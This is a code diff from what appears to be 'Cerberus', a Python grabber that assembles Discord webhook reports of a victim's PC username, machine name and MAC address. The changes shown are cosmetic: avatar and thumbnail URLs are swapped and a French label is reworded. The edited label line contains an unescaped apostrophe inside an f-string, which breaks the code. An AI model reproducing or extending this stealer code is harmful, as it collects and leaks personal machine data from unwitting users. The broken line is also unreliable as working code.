@@ -857,7 +857,7 @@ class Webhooks:
 
         data = {
             "username": "Cerberus",
-            "avatar_url": "https://cdn.discordapp.com/attachments/873585930529824839/875822929936523274/Cerber.jpg"
+            "avatar_url": "https://repository-images.githubusercontent.com/384839930/101bbebc-b381-454c-ab42-b94bedf1e070"
             }
 
         if content: data["content"] = content
@@ -1210,7 +1210,7 @@ class Grab:
                     "description": "https://github.com/billythegoat356/Cerberus",
                     "url": "https://github.com/billythegoat356/Cerberus",
                     "image": {
-                        "url": "https://cdn.discordapp.com/attachments/873585930529824839/875822929936523274/Cerber.jpg"
+                        "url": "https://repository-images.githubusercontent.com/384839930/101bbebc-b381-454c-ab42-b94bedf1e070"
                     },
                     "color": 0xd15943,
                     "fields": [
@@ -1221,7 +1221,7 @@ class Grab:
                         },
                         {
                             "name": "**Infos du PC**",
-                            "value": f'Nom de la machine: {computer_username}\nNom du PC: {computer_name}\nAdresse MAC: {mac_address}',
+                            "value": f'Nom de l'utilisateur: {computer_username}\nNom de la machine: {computer_name}\nAdresse MAC: {mac_address}',
                             "inline": True
                         },
                         {
@@ -1251,7 +1251,7 @@ class Grab:
                     },
 
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/attachments/873585930529824839/875822715427246110/Cerberus.jpg"
+                        "url": "https://repository-images.githubusercontent.com/384839930/101bbebc-b381-454c-ab42-b94bedf1e070"
                     },
 
                     "footer": {
